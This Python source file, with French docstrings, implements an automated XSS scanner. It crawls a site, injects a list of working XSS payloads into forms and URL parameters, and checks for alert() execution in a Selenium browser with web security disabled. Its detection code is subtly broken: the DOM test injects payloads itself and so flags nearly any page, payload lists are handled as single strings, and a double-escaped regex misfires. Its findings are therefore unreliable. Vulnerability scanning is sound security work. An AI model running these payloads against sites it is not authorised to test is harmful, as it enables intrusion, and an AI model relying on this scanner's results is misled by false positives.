"""
Module de scanner avancé pour la détection de vulnérabilités XSS (Cross-Site Scripting).

Ce module fournit une implémentation d'un scanner automatisé pour détecter les 
vulnérabilités XSS dans les applications web. Il utilise une combinaison d'analyse 
statique et dynamique pour identifier plusieurs types de vulnérabilités XSS 
(réfléchies, stockées et DOM-based).

Le scanner effectue les opérations suivantes:
- Crawling des pages web à partir d'une URL de départ
- Analyse des formulaires et de leurs champs
- Test des paramètres d'URL
- Injection de payloads dans différents contextes
- Analyse dynamique avec Selenium pour détecter l'exécution réelle de code malveillant

Classes:
    AdvancedXSSScanner: Scanner principal pour la détection des vulnérabilités XSS
"""

import requests
from bs4 import BeautifulSoup, Comment
from urllib.parse import urlparse, urljoin, parse_qs
from selenium import webdriver
from selenium.common import TimeoutException, NoAlertPresentException
from selenium.webdriver.common.by import By
from selenium.webdriver.common.alert import Alert
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from concurrent.futures import ThreadPoolExecutor
import json
import hashlib
import re
import threading
import time
import logging


class AdvancedXSSScanner:
    """
    Scanner avancé pour la détection des vulnérabilités XSS dans les applications web.
    
    Cette classe implémente un scanner complet qui combine plusieurs techniques
    pour détecter les vulnérabilités XSS, y compris l'analyse statique et dynamique.
    Le scanner peut explorer automatiquement un site web, analyser les formulaires,
    tester les paramètres d'URL et détecter l'exécution de code malveillant.
    
    Attributes:
        target_url (str): URL cible de départ pour l'analyse
        base_url (str): URL de base extraite de l'URL cible
        session (requests.Session): Session HTTP pour maintenir les cookies
        vulnerabilities (list): Liste des vulnérabilités détectées
        checked_forms (set): Ensemble des formulaires déjà analysés
        checked_urls (set): Ensemble des URLs déjà visitées
        lock (threading.Lock): Verrou pour la synchronisation des threads
        csrf_tokens (dict): Dictionnaire pour stocker les tokens CSRF
        scan_depth (int): Profondeur maximale d'exploration du site
        timeout (int): Délai d'attente pour les requêtes HTTP
        max_threads (int): Nombre maximum de threads parallèles
        rate_limit (float): Limite de requêtes par seconde
        payloads (dict): Dictionnaire de payloads XSS selon le contexte
        driver (webdriver.Chrome): Instance du navigateur Selenium
    """
    
    def __init__(self, target_url, headless=True):
        """
        Initialise le scanner XSS avec l'URL cible.
        
        Args:
            target_url (str): URL cible à analyser
            headless (bool, optional): Si True, exécute le navigateur en mode headless. Défaut: True
        """
        self.target_url = target_url
        self.base_url = f"{urlparse(target_url).scheme}://{urlparse(target_url).netloc}"
        self.session = requests.Session()
        self.vulnerabilities = []
        self.checked_forms = set()
        self.checked_urls = set()
        self.lock = threading.Lock()
        self.csrf_tokens = {}

        # Configuration
        self.scan_depth = 2
        self.timeout = 10
        self.max_threads = 5
        self.rate_limit = 1.0

        # Enhanced payload list with context-specific vectors
        self.payloads = self.load_payloads()

        # Selenium WebDriver
        self.driver = self.init_selenium(headless)

        # Logger
        logging.basicConfig(level=logging.INFO)

        # Add a User-Agent for requests to mimic a real browser
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'
        })

    def init_selenium(self, headless):
        """
        Initialise et configure le navigateur Selenium.
        
        Configure les options du navigateur Chrome pour l'analyse de sécurité,
        notamment en désactivant certaines protections pour permettre les tests.
        
        Args:
            headless (bool): Si True, exécute le navigateur en mode headless
            
        Returns:
            webdriver.Chrome: Instance configurée du navigateur Chrome
        """
        options = webdriver.ChromeOptions()
        if headless:
            options.add_argument("--headless=new")
        options.add_argument("--disable-gpu")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-web-security")
        options.add_argument("--allow-running-insecure-content")
        return webdriver.Chrome(options=options)

    def load_payloads(self):
        """
        Charge les différents payloads XSS selon leur contexte d'utilisation.
        
        Retourne un dictionnaire de payloads organisés par contexte:
        - html: Payloads pour injection dans le contenu HTML
        - attribute: Payloads pour injection dans les attributs
        - script: Payloads pour injection dans les contextes JavaScript
        - polyglot: Payloads polyvalents fonctionnant dans plusieurs contextes
        - event_handlers: Payloads basés sur les gestionnaires d'événements
        - svg: Payloads utilisant des éléments SVG
        
        Returns:
            dict: Dictionnaire de payloads XSS organisés par contexte
        """
        return {
            "html": [
                '<svg/onload=alert("XSS")>',
                '<img src=x onerror=alert(document.domain)>',
                '<details open ontoggle=alert(1)>'
            ],
            "attribute": [
                '" autofocus onfocus=alert(1)',
                'javascript:alert(1)//',
                ' onmouseover=alert(1)'
            ],
            "script": [
                '</script><script>alert(1)</script>',
                '${alert(1)}',
                ';alert(1)'
            ],
            "polyglot": [
                'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(alert(1))//%0D%0A//</stYle/</scRipt/</teXtarEa>'
            ],
            "event_handlers": [
                'onload=alert("XSS")',
                'onmouseover=alert(1)',
                'onerror=alert(document.cookie)'
            ],
            "svg": [
                '<svg><script>alert(1)</script>',
                '<svg onload=alert(document.domain)>'
            ]
        }

    def scan(self):
        """
        Lance l'analyse complète du site web cible.
        
        Cette méthode démarre l'exploration du site et l'analyse des vulnérabilités
        en utilisant un pool de threads pour paralléliser le travail. Elle s'assure également
        que les ressources sont correctement libérées à la fin et génère un rapport
        des vulnérabilités détectées.
        
        Returns:
            None: Les résultats sont écrits dans le fichier xss_report.json
        """
        try:
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                executor.submit(self.crawl_and_spider)
        finally:
            self.driver.quit()
            self.generate_report()

    def crawl_and_spider(self):
        """
        Explore le site web en suivant les liens et analyse chaque page.
        
        Cette méthode implémente un algorithme d'exploration basé sur une file d'attente
        pour parcourir le site jusqu'à la profondeur spécifiée. Pour chaque page découverte,
        elle effectue des tests de vulnérabilités et explore les formulaires.
        Elle maintient également une liste des URLs et formulaires déjà analysés pour
        éviter les duplications.
        
        Returns:
            None: Les vulnérabilités détectées sont stockées dans self.vulnerabilities
        """
        queue = [(self.target_url, 0)]
        while queue:
            url, depth = queue.pop(0)
            if depth > self.scan_depth or url in self.checked_urls:
                continue

            self.checked_urls.add(url)

            try:
                response = self.session.get(url, timeout=self.timeout)
                soup = BeautifulSoup(response.content, "html.parser")

                self.test_dynamic_analysis(url)
                self.test_url_parameters(url)

                # Test forms
                for form in soup.find_all("form"):
                    form_hash = hashlib.md5(str(form).encode()).hexdigest()
                    if form_hash not in self.checked_forms:
                        self.checked_forms.add(form_hash)
                        self.test_form(form, url)

                # Find links
                for link in soup.find_all("a", href=True):
                    absolute_url = urljoin(self.base_url, link["href"])
                    if absolute_url not in self.checked_urls:
                        queue.append((absolute_url, depth + 1))

            except Exception as e:
                logging.error(f"Error while processing {url}: {str(e)}\n")

    def cleanup_alerts(self):
        """
        Nettoie les alertes JavaScript existantes dans le navigateur.
        
        Cette méthode permet d'éviter que des alertes préexistantes interfèrent
        avec la détection de nouvelles alertes lors des tests.
        
        Returns:
            None
        """
        try:
            Alert(self.driver).dismiss()
        except:
            pass

    def test_dynamic_analysis(self, url):
        """
        Effectue une analyse dynamique pour détecter les vulnérabilités XSS DOM-based.
        
        Cette méthode injecte des payloads XSS directement dans le DOM de la page via
        JavaScript et surveille l'apparition d'alertes, indicateur que le code injecté
        a été exécuté avec succès. Chaque payload est injecté séquentiellement dans
        le contenu HTML de la page.
        
        Le processus suit les étapes suivantes:
        1. Navigation vers l'URL cible
        2. Nettoyage des alertes existantes
        3. Injection des payloads dans le DOM via JavaScript
        4. Attente de l'apparition d'une alerte (indicateur d'une vulnérabilité)
        5. Enregistrement des vulnérabilités détectées
        
        Args:
            url (str): L'URL de la page à analyser
            
        Returns:
            None: Les vulnérabilités détectées sont stockées dans self.vulnerabilities
        """
        try:
            for payload in self.payloads.values():
                self.driver.get(url)
                self.cleanup_alerts()  # Nettoyage préalable

                script = f"try {{ document.body.innerHTML += {json.dumps(payload)}; }} catch(e) {{}}"
                self.driver.execute_script(script)

                # Attente conditionnelle de l'alerte
                try:
                    WebDriverWait(self.driver, 1).until(EC.alert_is_present())
                    Alert(self.driver).accept()
                    self.log_vulnerability("DOM_XSS", payload, url)
                except (TimeoutException, NoAlertPresentException):
                    continue

                time.sleep(0.5)
        except Exception as e:
            logging.error(f"Erreur d'analyse dynamique: {str(e)}")

    def test_url_parameters(self, url):
        """
        Analyse les paramètres d'URL pour détecter les vulnérabilités XSS.
        
        Cette méthode extrait les paramètres de l'URL et teste chacun d'eux
        pour déterminer s'ils peuvent être utilisés pour injecter du code malveillant.
        Elle vérifie d'abord la validité de l'URL, puis extrait et analyse
        chaque paramètre individuellement.
        
        Args:
            url (str): L'URL à analyser
            
        Raises:
            ValueError: Si l'URL fournie est invalide ou vide
            
        Returns:
            None: Les vulnérabilités détectées sont stockées dans self.vulnerabilities
        """
        # Validation de l'entrée
        if not isinstance(url, str) or not url.strip():
            raise ValueError("L'URL fournie est invalide ou vide.")

        try:
            # Extraction des paramètres de l'URL
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            # Analyse des paramètres
            for param, values in params.items():
                if not values:  # Ignorer les paramètres sans valeur
                    continue

                for value in values:
                    self.test_parameter(url, f"{param}={value}", "GET")
        except Exception as e:
            # Gestion des exceptions et journalisation
            print(f"Erreur lors de l'analyse des paramètres pour l'URL {url}: {e}\n")

    def test_form(self, form, url):
        """
        Teste un formulaire web pour détecter les vulnérabilités XSS.
        
        Cette méthode analyse un formulaire HTML, identifie ses champs et
        injecte des payloads XSS dans chacun d'eux. Elle prend également
        en compte les tokens CSRF pour maintenir des requêtes valides.
        
        Args:
            form (bs4.element.Tag): L'élément de formulaire à tester
            url (str): L'URL contenant le formulaire
            
        Returns:
            None: Les vulnérabilités détectées sont stockées dans self.vulnerabilities
        """
        action = urljoin(url, form.get("action", ""))
        method = form.get("method", "get").lower()
        inputs = form.find_all(["input", "textarea", "select"])
        
        # Récupération des tokens CSRF
        form_data = {}
        for inp in inputs:
            name = inp.get("name")
            if name and "csrf" in name.lower():
                self.csrf_tokens[name] = inp.get("value", "")
        
        # Injection des payloads dans tous les champs
        for payload_type in ["html", "attribute", "script"]:
            for payload in self.payloads[payload_type]:
                data = {
                    inp.get("name"): payload for inp in inputs if inp.get("name")
                }
                data.update(self.csrf_tokens)  # Injection des tokens CSRF
                self.send_request(action, method, data, payload)

    def send_request(self, url, method, data, payload=None):
        """
        Envoie une requête HTTP avec des données potentiellement malveillantes.
        
        Cette méthode envoie une requête GET ou POST à l'URL spécifiée avec les
        données fournies, puis analyse la réponse pour détecter d'éventuelles
        vulnérabilités. Elle utilise également Selenium pour vérifier si le
        payload a été exécuté dans le navigateur.
        
        Args:
            url (str): L'URL à laquelle envoyer la requête
            method (str): La méthode HTTP à utiliser ("get" ou "post")
            data (dict): Les données à envoyer avec la requête
            payload (str, optional): Le payload XSS à rechercher dans la réponse
            
        Returns:
            None: Les vulnérabilités détectées sont stockées dans self.vulnerabilities
        """
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        try:
            if method == "post":
                response = self.session.post(url, data=data, headers=headers)
            else:
                response = self.session.get(url, params=data, headers=headers)

            if payload:
                self.analyze_response(response, payload)
                
                # Vérification de l'exécution dans Selenium
                try:
                    self.driver.get(response.url)
                    if payload in self.driver.page_source:
                        if self.check_payload_execution():
                            self.log_vulnerability("EXECUTED", payload, response.url)
                except Exception as e:
                    logging.error(f"Execution check failed: {str(e)}\n")
                    
        except Exception as e:
            logging.error(f"Error sending request to {url}: {str(e)}\n")

    def check_payload_execution(self):
        """
        Vérifie si un payload XSS a été exécuté dans le navigateur.
        
        Cette méthode attend l'apparition d'une alerte JavaScript dans
        le navigateur, ce qui indique l'exécution réussie d'un payload XSS.
        
        Returns:
            bool: True si une alerte a été détectée, False sinon
        """
        try:
            WebDriverWait(self.driver, 2).until(EC.alert_is_present())
            Alert(self.driver).accept()
            return True
        except:
            return False

    def analyze_response(self, response, payload):
        """
        Analyse une réponse HTTP pour détecter les reflets de payloads XSS.
        
        Cette méthode recherche le payload dans différents contextes de la
        réponse HTTP (HTML, JavaScript, attributs) pour identifier les
        vulnérabilités XSS réfléchies.
        
        Args:
            response (requests.Response): La réponse HTTP à analyser
            payload (str): Le payload XSS à rechercher
            
        Returns:
            None: Les vulnérabilités détectées sont stockées dans self.vulnerabilities
        """
        # Vérification avancée des contextes
        contexts = {
            "unencoded_html": re.search(re.escape(re.escape(payload)), response.text),
            "javascript_context": re.search(rf'(?i)(=\s*[\'"]?|{{)({re.escape(payload)})', response.text),
            "attribute_context": re.search(rf'(?i)<\w+[^>]+\b\w+=([\'"])(.*?{re.escape(payload)}.*?)\1', response.text)
        }
        
        if any(contexts.values()):
            self.log_vulnerability("REFLECTED", payload, response.url)

    def log_vulnerability(self, context, payload, url=None):
        """
        Enregistre une vulnérabilité détectée.
        
        Cette méthode ajoute une entrée dans la liste des vulnérabilités avec
        les détails de la vulnérabilité détectée, notamment son contexte,
        le payload utilisé, l'URL concernée et sa gravité.
        
        Args:
            context (str): Le contexte de la vulnérabilité (DOM_XSS, REFLECTED, EXECUTED)
            payload (str): Le payload XSS utilisé
            url (str, optional): L'URL où la vulnérabilité a été détectée
            
        Returns:
            None: La vulnérabilité est ajoutée à self.vulnerabilities
        """
        with self.lock:
            vuln = {
                "url": url or self.driver.current_url,
                "payload": payload,
                "context": context,
                "severity": "High" if context == "EXECUTED" else "Medium"
            }
            self.vulnerabilities.append(vuln)

    def generate_report(self):
        """
        Génère un rapport des vulnérabilités détectées.
        
        Cette méthode crée un rapport JSON contenant toutes les vulnérabilités
        détectées, ainsi que des statistiques sur l'analyse effectuée. Le rapport
        est enregistré dans un fichier JSON.
        
        Returns:
            None: Le rapport est écrit dans le fichier xss_report.json
        """
        report = {
            "target": self.target_url,
            "scan_date": time.ctime(),
            "vulnerabilities": self.vulnerabilities,
            "stats": {
                "pages_crawled": len(self.checked_urls),
                "forms_tested": len(self.checked_forms),
            }
        }

        with open("xss_report.json", "w") as f:
            json.dump(report, f, indent=2)

        logging.info(f"Report generated with {len(self.vulnerabilities)} vulnerabilities.")


if __name__ == "__main__":
    target_url = "http://localhost:3000/index.html"
    scanner = AdvancedXSSScanner(target_url)
    scanner.scan()